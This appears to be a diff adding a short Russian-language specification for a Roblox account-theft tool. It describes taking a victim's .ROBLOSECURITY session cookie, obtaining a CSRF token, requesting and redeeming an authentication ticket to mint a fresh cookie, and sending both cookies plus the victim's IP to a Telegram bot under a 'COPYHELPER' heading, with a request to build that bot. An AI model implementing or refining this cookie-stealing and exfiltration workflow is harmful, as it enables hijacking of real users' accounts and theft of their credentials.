@@ -1,0 +1,32 @@
+после получения кука (.ROBLOSECURITY) с сайта, - делаем post запрос на www.roblox.com/home/ с этим куком.
+
+получаем заголовок x-csrf-token
+получаем заголовок set-cookie
+
+после получения заголовков делаем post запрос на https://auth.roblox.com/v1/authentication-ticket с заголовками:
+x-csrf-token: (сейвнутый токен)
+set-cookie: (сейвнутый куки)
+referer: roblox.com
+
+
+Оттуда получаем заголовок rbx-authentication-ticket делаем post запрос к https://auth.roblox.com/v1/authentication-ticket/redeem
+с заголовком RBXauthenticationNegotiation: 1
+и пост датой authenticationTicket=(сейвнутый тикет)
+
+Сейвим новый куки (.ROBLOSECURITY), отправляем в тг
+
+
+
+Сделай плиз, что бы бот отправлял вот так :
+
+🎮 Новая заявка — COPYHELPER
+
+
+
+📅 Дата:  UTC
+
+🌐 IP:
+
+Содержимое: (ТУТ ИЗНАЧАЛЬНЫЙ КУК)
+
+Новый Кук: (НОВЫЙ КУК)
